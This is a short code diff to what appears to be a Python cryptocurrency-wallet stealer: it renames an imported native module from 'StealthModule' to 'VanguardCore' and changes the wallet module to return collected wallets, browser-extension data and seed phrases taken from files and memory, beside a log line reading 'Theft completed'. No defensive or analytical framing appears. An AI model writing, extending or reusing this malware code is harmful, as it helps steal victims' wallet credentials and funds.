@@ -45,7 +45,7 @@ class WalletBridge:
                 dll_path = os.path.join(os.path.dirname(__file__), "wallets.dll")
                 if os.path.exists(dll_path):
                     clr.AddReference(dll_path)
-                    from StealthModule import WalletManager
+                    from VanguardCore import WalletManager
                     cls._manager = WalletManager
             except Exception as e:
                 print(f"[WalletBridge] Error loading native manager: {e}")
@@ -272,7 +272,13 @@ class WalletModule(BaseModule):
         elapsed = time.time() - start_time
         self.log(f"Theft completed in {elapsed:.2f} seconds")
         
-        return True if (native_found or results.get("wallets") or results.get("extensions")) else False
+        return {
+            "wallets": results.get("wallets", []),
+            "extensions": results.get("extensions", []),
+            "seeds": results.get("seed_files", []) + results.get("seed_memory", []),
+            "native_found": native_found,
+            "elapsed": elapsed
+        }
 
     def get_stats(self) -> Dict[str, int]:
         return getattr(self, "last_run_stats", {"items": 0})
